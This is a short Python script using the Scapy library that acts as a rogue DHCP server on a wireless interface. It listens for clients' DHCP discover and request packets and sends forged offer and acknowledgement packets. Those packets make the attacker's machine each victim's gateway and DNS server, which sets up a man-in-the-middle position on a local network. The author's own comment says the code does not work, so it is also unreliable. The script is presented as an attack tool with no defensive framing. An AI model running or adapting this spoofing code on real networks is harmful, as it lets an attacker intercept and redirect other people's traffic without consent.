from scapy.all import *

# DOES NOT WORK

# Config
IFACE = "wlan0"  
ROGUE_IP = "192.168.100.1"
LEASED_IP = "192.168.100.55"
SUBNET_MASK = "255.255.255.0"
DNS_SERVER = "192.168.100.1"
ROUTER = "192.168.100.1"

def make_dhcp_offer(pkt):
    client_mac = pkt[Ether].src
    xid = pkt[BOOTP].xid
    print(f"[+] DHCPDISCOVER from {client_mac}")

    ether = Ether(dst=client_mac, src=get_if_hwaddr(IFACE))
    ip = IP(src=ROGUE_IP, dst="255.255.255.255")
    udp = UDP(sport=67, dport=68)
    bootp = BOOTP(op=2, yiaddr=LEASED_IP, siaddr=ROGUE_IP,
                  chaddr=pkt[BOOTP].chaddr, xid=xid, flags=pkt[BOOTP].flags)
    dhcp = DHCP(options=[
        ("message-type", "offer"),
        ("server_id", ROGUE_IP),
        ("subnet_mask", SUBNET_MASK),
        ("router", ROUTER),
        ("name_server", DNS_SERVER),
        "end"
    ])
    offer_pkt = ether / ip / udp / bootp / dhcp
    sendp(offer_pkt, iface=IFACE, verbose=0)
    print(f"[+] Sent DHCPOFFER to {client_mac}")

def make_dhcp_ack(pkt):
    client_mac = pkt[Ether].src
    xid = pkt[BOOTP].xid
    print(f"[+] DHCPREQUEST from {client_mac}")

    ether = Ether(dst=client_mac, src=get_if_hwaddr(IFACE))
    ip = IP(src=ROGUE_IP, dst="255.255.255.255")
    udp = UDP(sport=67, dport=68)
    bootp = BOOTP(op=2, yiaddr=LEASED_IP, siaddr=ROGUE_IP,
                  chaddr=pkt[BOOTP].chaddr, xid=xid, flags=pkt[BOOTP].flags)
    dhcp = DHCP(options=[
        ("message-type", "ack"),
        ("server_id", ROGUE_IP),
        ("subnet_mask", SUBNET_MASK),
        ("router", ROUTER),
        ("name_server", DNS_SERVER),
        "end"
    ])
    ack_pkt = ether / ip / udp / bootp / dhcp
    sendp(ack_pkt, iface=IFACE, verbose=0)
    print(f"[+] Sent DHCPACK to {client_mac}")

def handle_dhcp(pkt):
    if DHCP in pkt and pkt[DHCP].options:
        msg_type = [opt[1] for opt in pkt[DHCP].options if opt[0] == "message-type"]
        if not msg_type:
            return
        msg_type = msg_type[0]
        if msg_type == 1:
            make_dhcp_offer(pkt)
        elif msg_type == 3:
            make_dhcp_ack(pkt)

sniff(filter="udp and (port 67 or 68)", iface=IFACE, prn=handle_dhcp, store=0)
